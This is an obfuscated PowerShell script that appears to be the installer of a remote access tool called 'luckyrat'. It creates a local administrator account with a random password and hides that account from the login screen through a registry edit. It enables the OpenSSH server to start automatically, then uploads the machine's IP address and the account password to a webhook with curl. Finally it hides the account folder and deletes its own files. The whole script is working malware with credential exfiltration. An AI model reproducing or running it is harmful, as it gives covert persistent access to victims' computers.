function TnVxAzPYQr {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function OqFLcwMGTr {
    [CmdletBinding()]
    param (
        [string] $RVPgXkTWmj,
        [securestring] $LfZHduBnce
    )
    begin {
    }
    process {
        New-LocalUser "$RVPgXkTWmj" -Password $LfZHduBnce -FullName "$RVPgXkTWmj" -Description "Temporary local admin"
        Write-Verbose "$RVPgXkTWmj local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$RVPgXkTWmj"
        Write-Verbose "$RVPgXkTWmj added to the local administrator group"
    }
    end {
    }
}

# make admin
$RVPgXkTWmj = "luckyrat"
$UNFmSAeJvK = TnVxAzPYQr
Remove-LocalUser -Name $RVPgXkTWmj
$AqZhWkfJmr = (ConvertTo-SecureString $UNFmSAeJvK -AsPlainText -Force)
OqFLcwMGTr -RVPgXkTWmj $RVPgXkTWmj -LfZHduBnce $AqZhWkfJmr

# registry
$TbXVrNLoqi = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$ZJhmqwYaxG = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $TbXVrNLoqi -Name $RVPgXkTWmj -Value $ZJhmqwYaxG -PropertyType DWORD -Force

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# rat file
$WqHnJdGoCE = "$env:UserName.rat"
$ZCRbfKSoEt = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

New-Item -Path $WqHnJdGoCE -Force
Add-Content -Path $WqHnJdGoCE -Value $ZCRbfKSoEt -Force # local ip addr
Add-Content -Path $WqHnJdGoCE -Value $UNFmSAeJvK -Force # pass
Add-Content -Path $WqHnJdGoCE -Value $env:temp -Force # temp
Add-Content -Path $WqHnJdGoCE -Value $pwd -Force # startup
Add-Content -Path $WqHnJdGoCE -Value "N/A" -Force # remote host
Add-Content -Path $WqHnJdGoCE -Value "N/A" -Force # remote port
Add-Content -Path $WqHnJdGoCE -Value 'local' -Force # connection type

# send file to webhook
$UXVoYlrHPz = Get-Content LoKHjdNA.txt | Out-String
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"luckyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $UXVoYlrHPz"

# cleanup
attrib +h +s +r C:/Users/luckyrat 
Remove-Item $WqHnJdGoCE -Force
Remove-Item LoKHjdNA.txt -Force
Remove-Item JKOmnHjUiwer.ps1 -Force
